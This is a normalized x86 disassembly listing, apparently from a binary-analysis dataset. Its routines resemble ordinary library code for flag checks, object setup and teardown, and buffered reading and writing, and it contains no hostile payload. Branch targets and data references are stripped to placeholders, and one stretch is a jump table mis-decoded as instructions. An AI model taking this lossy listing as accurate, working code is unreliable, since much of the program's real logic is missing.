test cl 0x1
je r-xdata
test [ esi + 0x2c ] al
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x2c ] 0x20
jne r-xdata
test al 0x80
je r-xdata
mov ebx ecx
and ebx 0x60
cmp bl 0x60
jne r-xdata
test cl 0x10
je r-xdata
mov eax 0x2
jmp r-xdata
test edx edx
jne r-xdata
pop esi
mov eax 0x3
pop ebx
retn
pop esi
mov eax 0x1
pop ebx
retn
test cl 0x2
je r-xdata
test cl 0x8
je r-xdata
mov ecx [ esi + 0x34 ]
test cl 0x7
je r-xdata
test cl 0x2
mov eax 0x5
jne r-xdata
pop esi
xor eax eax
pop ebx
retn
sub_100242c0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov cl 0x2
test [ eax + 0x28 ] cl
je r-xdata
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0x28 ]
mov ecx eax
and ecx 0x2
je r-xdata
mov eax 0x1
retn
test [ eax + 0x2c ] cl
jne r-xdata
test al 0x1
je r-xdata
test [ esi + 0x2c ] 0x4
je r-xdata
xor eax eax
retn
mov edx eax
and edx 0x60
cmp dl 0x60
jne r-xdata
and eax 0xff
pop esi
shr eax 0x4
and eax 0x1
retn
xor eax eax
pop esi
retn
test ecx ecx
je r-xdata
mov eax 0x3
pop esi
retn
test al 0x8
je r-xdata
mov eax 0x4
pop esi
retn
test [ esi + 0x34 ] 0x7
je r-xdata
mov eax 0x5
pop esi
retn
sub_10024340
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov eax 0x1
retn
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0x28 ]
mov ecx eax
and ecx 0x2
je r-xdata
test al 0x1
je r-xdata
test [ esi + 0x2c ] 0x4
je r-xdata
mov edx eax
and edx 0x60
cmp dl 0x60
jne r-xdata
and eax 0xff
pop esi
shr eax 0x4
and eax 0x1
retn
xor eax eax
pop esi
retn
test ecx ecx
je r-xdata
mov eax 0x3
pop esi
retn
test al 0x8
je r-xdata
mov eax 0x4
pop esi
retn
test [ esi + 0x34 ] 0x7
je r-xdata
mov eax 0x5
pop esi
retn
sub_100243b0
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call sub_10021330
mov ebp [ esp + 0x18 ]
add esp 0x4
push eax
push ebp
call sub_10021340
add esp 0x4
push eax
call sub_10021390
add esp 0x8
test eax eax
je r-xdata
push ebp
call sub_10023b40
push ebx
call sub_10023b40
mov eax [ ebx + 0x3c ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1d
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov al [ ebp + 0x28 ]
test ah 0x4
je r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
test al 0x2
je r-xdata
test al 0x2
je r-xdata
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x38 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
test [ ebp + 0x2c ] 0x4
jne r-xdata
test [ ebp + 0x2c ] 0x80
jne r-xdata
mov ecx [ ebx + 0x3c ]
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
push eax
push ebp
call sub_1002b5c0
add esp 0x4
push eax
call sub_1002f100
add esp 0x8
test eax eax
je r-xdata
push ecx
push eax
call sub_10036a40
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x20
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x27
pop ebx
retn
push esi
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1f
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x1e
pop ebx
retn
push edi
push esi
call sub_1001e7c0
mov ecx [ eax ]
add esp 0x8
cmp ecx 0x4
je r-xdata
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
push esi
inc edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
push ebp
call sub_10021330
push eax
push esi
call sub_10021390
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1f
pop ebx
retn
sub_10024500
push ebx
push esi
push edi
push 0x6f
push r--data
push 0x4c
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
push 0x72
push r--data
push 0x41
push 0x69
push 0x5
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x10 ]
mov [ esi + 0x44 ] eax
cmp ebx edi
je r-xdata
call sub_1002b0a0
mov [ rw-data ] eax
call sub_10036a80
mov [ esi + 0x48 ] eax
push ebx
call sub_100225b0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esi + 0x44 ]
lea ebx [ esi + 0x3c ]
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x38 ] 0x1
mov edx [ ecx + 0x18 ]
push ebx
push esi
push 0x8
mov [ esi + 0x1c ] edx
call sub_1001f420
mov eax [ esi + 0x44 ]
add esp 0xc
mov eax [ eax + 0x10 ]
cmp eax edi
je r-xdata
push eax
call sub_10036db0
add esp 0x4
cmp eax edi
mov [ esi + 0x44 ] eax
jne r-xdata
mov [ esi + 0x48 ] ebx
jmp r-xdata
push 0x7c
push r--data
push 0x26
push 0x69
push 0x5
call sub_1001de60
push esi
call sub_1001d740
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax esi
pop edi
pop esi
pop ebx
retn
push esi
call eax
add esp 0x4
test eax eax
jne r-xdata
push 0x89
push r--data
push 0x26
push 0x69
push 0x5
call sub_1001de60
mov eax [ esi + 0x48 ]
push eax
call sub_10022640
push esi
call sub_1001d740
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x48 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x48 ]
cmp eax edi
je r-xdata
push ebx
push esi
push 0x8
call sub_1001f490
push esi
call sub_1001d740
add esp 0x10
xor esi esi
push eax
call sub_10022640
add esp 0x4
sub_10024660
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0xb2
push r--data
push 0x1a
lea eax [ esi + 0x38 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov ecx [ esi + 0x44 ]
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push esi
call eax
add esp 0x4
lea edx [ esi + 0x3c ]
push edx
push esi
push 0x8
call sub_1001f490
mov eax [ esi + 0x8 ]
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_10022640
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_100298f0
add esp 0x4
sub_10024770
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push eax
mov eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x10 ]
push edx
push eax
call [ ecx + 0x4 ]
add esp 0x14
retn
sub_100247a0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push eax
mov eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x10 ]
push edx
push eax
call [ ecx + 0xc ]
add esp 0x14
retn
sub_100247d0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push eax
mov eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x10 ]
push edx
push eax
call [ ecx + 0x8 ]
add esp 0x14
retn
sub_10024820
mov eax 0x28
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x38 ]
xor ebx ebx
cmp esi ebx
mov [ esp + 0x8 ] ebx
jne r-xdata
push ebp
push edi
push esi
call sub_1002dd20
push esi
call sub_1002de70
mov edi [ esp + 0x44 ]
mov ebp eax
add esp 0x8
cmp ebp ebx
jne r-xdata
call sub_1002dc50
mov esi eax
cmp esi ebx
jne r-xdata
mov ebp [ edi + 0x14 ]
cmp ebp ebx
jne r-xdata
push 0xb9
push r--data
push 0x41
push 0x88
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x28
retn
call sub_100219e0
test eax eax
jne r-xdata
mov eax [ edi + 0x18 ]
mov edx [ edi + 0x20 ]
mov ecx [ edi + 0x1c ]
cmp eax ebx
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ebx
je r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x44 ]
add esp 0x4
test eax eax
jne r-xdata
mov eax [ edi + 0x3c ]
test ah 0x1
jne r-xdata
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
xor ebp ebp
jmp r-xdata
cmp ecx ebx
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
jne r-xdata
push esi
call sub_1002dcb0
add esp 0x4
mov ecx [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
lea ecx [ esp + 0x24 ]
mov edx [ eax ]
mov [ esp + 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x28 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x2c ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x30 ] edx
mov eax [ eax + 0x10 ]
mov edx [ esp + 0x34 ]
and al 0xfe
and edx 0x1
or eax edx
or al 0x6
mov [ esp + 0x34 ] eax
jmp r-xdata
mov ecx [ eax ]
test ecx ecx
je r-xdata
push 0xc2
push r--data
push 0x8c
push 0x88
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
cmp edx ebx
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop ebp
pop esi
pop ebx
add esp 0x28
retn
push ebp
call sub_10029950
add esp 0x4
call sub_1001f590
push eax
push ebx
call sub_10036dc0
add esp 0x8
push 0xde
push r--data
push 0x3
push 0x88
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ edi + 0x40 ]
mov edx [ edi + 0x8 ]
push eax
mov eax [ edx + 0x18 ]
push eax
push esi
push ecx
push ebp
push 0x0
call sub_10036dd0
mov ebx eax
add esp 0x18
test ebx ebx
mov [ esp + 0x10 ] ebx
jne r-xdata
mov edx [ eax + 0x8 ]
push 0x0
shl edx 0x2
push 0x0
push edx
push ecx
call sub_10021890
add esp 0x10
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x4c ] eax
call sub_1002de70
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
mov ebp [ esp + 0x20 ]
call sub_10029810
mov ecx [ esp + 0x3c ]
push eax
mov eax [ esp + 0x18 ]
push eax
push ecx
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
call sub_10029810
mov edx [ esp + 0x18 ]
push eax
push edx
push ebx
call sub_10038960
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
push esi
push ebx
push eax
push ebp
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
push esi
push ebp
push ecx
push 0x0
call sub_10036f90
add esp 0x10
mov ebp eax
jmp r-xdata
push esi
call sub_1002de00
add esp 0x4
test ebp ebp
jne r-xdata
sub_10024a90
push esi
push edi
push 0x61
push r--data
push 0x20
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
push 0x63
push r--data
push 0x1000
call sub_1001d4c0
add esp 0xc
cmp eax edi
mov [ esi + 0x8 ] eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
push 0x65
push r--data
push 0x1000
call sub_1001d4c0
add esp 0xc
cmp eax edi
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
retn
mov eax [ esp + 0xc ]
mov [ esi ] 0x1000
mov [ esi + 0x4 ] 0x1000
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ eax + 0x14 ] edi
mov [ eax + 0xc ] 0x1
mov [ eax + 0x20 ] esi
pop edi
mov eax 0x1
pop esi
retn
mov eax [ esi + 0x8 ]
push eax
call sub_1001d740
push esi
call sub_1001d740
add esp 0x8
xor eax eax
pop edi
pop esi
retn
sub_10024b40
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov edi [ edi + 0x14 ]
test edi edi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi + 0x20 ]
push eax
call sub_1001d740
add esp 0x4
mov [ esi + 0x20 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x14 ] 0x0
pop edi
mov eax 0x1
pop esi
retn
push edi
call sub_1001d740
add esp 0x4
sub_10024ba0
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x18 ]
mov ebx [ edi + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ edi + 0x24 ]
test eax eax
je r-xdata
push 0xf
push edi
mov [ esp + 0x18 ] 0x0
call sub_10020900
mov ebp [ esp + 0x28 ]
add esp 0x8
mov eax [ ebx ]
cmp ebp eax
jg r-xdata
cmp eax ebp
jle r-xdata
mov edx [ esp + 0x1c ]
mov eax [ edi + 0x24 ]
push ebp
push edx
push eax
call sub_10020930
mov esi eax
add esp 0xc
test esi esi
jg r-xdata
mov ecx [ edi + 0x24 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push ecx
call sub_10020930
mov esi eax
add esp 0xc
test esi esi
jg r-xdata
mov esi [ ebx + 0x8 ]
mov edi [ ebx + 0x10 ]
mov ecx eax
add esi edi
mov edi [ esp + 0x1c ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x10 ]
and ecx 0x3
add edx eax
[ edi ] [ esi ]
mov edi [ ebx + 0x10 ]
mov esi [ ebx + 0xc ]
add edi eax
sub esi eax
cmp ebp eax
mov [ ebx + 0x10 ] edi
mov [ ebx + 0xc ] esi
mov [ esp + 0x10 ] edx
je r-xdata
mov eax ebp
mov ecx [ esp + 0x10 ]
add ecx esi
cmp ebp esi
mov [ esp + 0x10 ] ecx
je r-xdata
push edi
call sub_10020fb0
add esp 0x4
test esi esi
jl r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] esi
jmp r-xdata
push edi
call sub_10020fb0
add esp 0x4
test esi esi
jl r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ esp + 0x1c ]
mov edi [ esp + 0x18 ]
sub ebp eax
add ecx eax
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x1c ]
add ecx esi
sub ebp esi
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_10024cf0
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
test eax eax
push edi
mov [ esp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov ebp [ esp + 0x20 ]
test ebp ebp
jle r-xdata
mov edi [ esp + 0x18 ]
mov ebx [ edi + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ edi + 0x24 ]
test eax eax
je r-xdata
push 0xf
push edi
call sub_10020900
mov eax [ ebx + 0x4 ]
mov esi [ ebx + 0x1c ]
mov edx [ ebx + 0x18 ]
sub eax esi
sub eax edx
add esp 0x8
cmp eax ebp
jge r-xdata
mov edi [ ebx + 0x14 ]
mov edx [ ebx + 0x18 ]
mov esi [ esp + 0x1c ]
mov ecx ebp
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x18 ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x8 ]
add eax ebp
pop ebp
pop ebx
pop ecx
retn
mov edx [ ebx + 0x18 ]
test edx edx
je r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x1c ] 0x0
cmp ebp eax
jl r-xdata
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
mov esi [ ebx + 0x1c ]
mov edx [ ebx + 0x18 ]
sub eax esi
sub eax edx
cmp eax ebp
jl r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ edi + 0x24 ]
push ebp
push eax
push ecx
call sub_100209d0
mov esi eax
add esp 0xc
test esi esi
jg r-xdata
mov ecx [ ebx + 0x1c ]
mov edx [ ebx + 0x14 ]
mov eax [ ebx + 0x18 ]
add ecx edx
mov edx [ edi + 0x24 ]
push eax
push ecx
push edx
call sub_100209d0
mov esi eax
add esp 0xc
test esi esi
jg r-xdata
mov edi [ ebx + 0x14 ]
mov esi [ esp + 0x1c ]
mov ecx eax
add edi edx
mov edx ecx
sub ebp eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x10 ]
and ecx 0x3
add edx eax
[ edi ] [ esi ]
mov edi [ esp + 0x1c ]
mov ecx [ ebx + 0x18 ]
add edi eax
add ecx eax
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
mov [ ebx + 0x18 ] ecx
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
add edx esi
add ecx esi
sub ebp esi
mov [ esp + 0x10 ] edx
mov [ esp + 0x1c ] ecx
je r-xdata
push edi
call sub_10020fb0
add esp 0x4
test esi esi
jl r-xdata
mov ecx [ ebx + 0x1c ]
mov eax [ ebx + 0x18 ]
add ecx esi
sub eax esi
mov [ ebx + 0x1c ] ecx
mov [ ebx + 0x18 ] eax
jne r-xdata
push edi
call sub_10020fb0
add esp 0x4
test esi esi
jl r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp ebp [ ebx + 0x4 ]
jge r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jg r-xdata
je r-xdata
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_10024eb0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
lea eax [ ebp - 0x1 ]
mov ebx 0x1
mov edi [ esi + 0x20 ]
cmp eax 0x79
ja r-xdata
mov esi [ esi + 0x24 ]
test esi esi
jne r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_10025280 ]
jmp [ ecx * 4 + jump_table_10025254 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push eax
push ecx
push ebp
push esi
call sub_10020c60
add esp 0x10
mov ebx eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
xor eax eax
mov [ edi + 0x10 ] eax
mov [ edi + 0xc ] eax
mov [ edi + 0x1c ] eax
mov [ edi + 0x18 ] eax
mov esi [ esi + 0x24 ]
cmp esi eax
jne r-xdata
mov ebx [ edi + 0x18 ]
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov ecx [ edi + 0x8 ]
mov eax [ edi + 0x10 ]
mov edi [ edi + 0xc ]
xor ebx ebx
cmp eax edi
jge r-xdata
mov ebx [ edi + 0x18 ]
test ebx ebx
jne r-xdata
mov ebx [ edi + 0xc ]
test ebx ebx
jne r-xdata
mov esi [ esp + 0x1c ]
mov eax [ edi ]
cmp esi eax
jle r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
jne r-xdata
mov ecx [ edi ]
mov esi [ esp + 0x20 ]
push 0x0
push ecx
push 0x75
push esi
call sub_10020bc0
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push edx
push eax
push ebp
push esi
call sub_10020c60
add esp 0x10
mov ebx eax
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
cmp [ eax + ecx ] 0xa
jne r-xdata
mov esi [ esi + 0x24 ]
test esi esi
jne r-xdata
mov esi [ esi + 0x24 ]
test esi esi
jne r-xdata
mov ecx esi
mov [ edi + 0x10 ] 0x0
mov edx ecx
mov [ edi + 0xc ] esi
mov esi [ esp + 0x20 ]
mov edi [ edi + 0x8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov ebx 0x1
and ecx 0x3
mov eax ebx
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x141
push r--data
push esi
call sub_1001d4c0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov ebp [ esp + 0x1c ]
mov [ esp + 0x20 ] ebp
cmp [ eax ] 0x0
jne r-xdata
push 0xf
push esi
call sub_10020900
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
mov eax [ esi + 0x24 ]
push ecx
push edx
push ebp
push eax
call sub_10020c60
push esi
mov ebx eax
call sub_10020fb0
add esp 0x1c
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ecx [ edi + 0x18 ]
test ecx ecx
jg r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor ebx ebx
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov edx [ edi + 0x4 ]
push 0x1
push edx
push 0x75
push esi
call sub_10020bc0
add esp 0x10
test eax eax
jne r-xdata
inc eax
cmp eax edi
jl r-xdata
inc ebx
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push ecx
push edx
push ebp
push esi
call sub_10020c60
add esp 0x10
mov ebx eax
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x1b5
push r--data
push 0x41
push 0x72
push 0x20
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
cmp eax 0x1000
jle r-xdata
cmp ebp [ edi ]
je r-xdata
mov ecx [ esp + 0x1c ]
mov ebp [ edi ]
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov eax [ edi + 0x4 ]
mov ebp [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
jmp r-xdata
push 0xf
push esi
call sub_10020900
mov ecx [ edi + 0x18 ]
mov eax [ edi + 0x1c ]
add esp 0x8
cmp ecx eax
jle r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push ecx
push edx
push ebp
push eax
call sub_10020c60
add esp 0x10
mov ebx eax
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov [ edi + 0x8 ] ebx
push eax
call sub_1001d740
add esp 0x4
mov eax [ edi + 0x8 ]
cmp eax esi
je r-xdata
cmp eax [ edi + 0x4 ]
je r-xdata
mov eax [ esp + 0x1c ]
push 0x163
push r--data
push eax
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov edx [ edi + 0x14 ]
mov esi [ edi + 0x8 ]
cmp ebp 0x1000
mov [ esp + 0x14 ] edx
jle r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
xor eax eax
push ecx
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov eax [ esi + 0x24 ]
push edx
push ebp
push eax
call sub_10020c60
add esp 0x10
mov ebx eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ edi + 0x14 ]
sub ecx eax
add eax ebx
push ecx
push eax
mov eax [ esi + 0x24 ]
push eax
call sub_100209d0
push esi
mov ebx eax
call sub_10020fb0
add esp 0x10
test ebx ebx
jle r-xdata
mov eax [ edi + 0x14 ]
mov ecx [ esp + 0x14 ]
cmp eax ecx
je r-xdata
push eax
call sub_1001d740
add esp 0x4
xor eax eax
mov [ edi + 0x8 ] esi
mov [ edi + 0x10 ] eax
mov [ edi + 0xc ] eax
mov [ edi ] ebp
mov ecx [ esp + 0x1c ]
push 0x168
push r--data
push ecx
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
mov edx [ edi + 0x1c ]
push 0xf
add edx ebx
push esi
mov [ edi + 0x1c ] edx
call sub_10020900
mov ecx [ edi + 0x18 ]
mov eax [ edi + 0x1c ]
add esp 0x8
cmp ecx eax
jg r-xdata
push eax
call sub_1001d740
mov edx [ esp + 0x18 ]
add esp 0x4
xor eax eax
mov [ edi + 0x14 ] edx
mov [ edi + 0x1c ] eax
mov [ edi + 0x18 ] eax
mov eax [ esp + 0x20 ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
cmp esi [ edi + 0x8 ]
je r-xdata
push esi
call sub_1001d740
add esp 0x4
sub_1002528b
add al 0x5
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or al [ esi ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
pop es
or [ edx ] cl
or cl [ edx ]
or cl [ ecx ]
nop
nop
nop
nop
nop
nop
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x24 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push ecx
push edx
push eax
call sub_10020d00
add esp 0xc
retn
retn
sub_10025320
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
mov esi [ eax + 0x20 ]
push edi
push 0xf
push eax
mov [ esp + 0x18 ] 0x0
dec ebx
call sub_10020900
mov ebp [ esp + 0x24 ]
add esp 0x8
mov eax [ esi ]
mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
push eax
mov eax [ edx + 0x24 ]
push ecx
push eax
call sub_10020930
mov edi eax
add esp 0xc
test edi edi
jg r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ esi + 0x10 ]
add ecx eax
xor edi edi
xor eax eax
test edx edx
jle r-xdata
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x18 ]
push ecx
call sub_10020fb0
add esp 0x4
mov [ ebp ] 0x0
test edi edi
jl r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esi + 0x10 ]
add edx eax
sub ebx eax
mov [ esp + 0x10 ] edx
mov edx [ esi + 0xc ]
sub edx eax
add ecx eax
test edi edi
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] ecx
jne r-xdata
cmp eax ebx
jge r-xdata
mov edx [ esi + 0xc ]
test edx edx
jle r-xdata
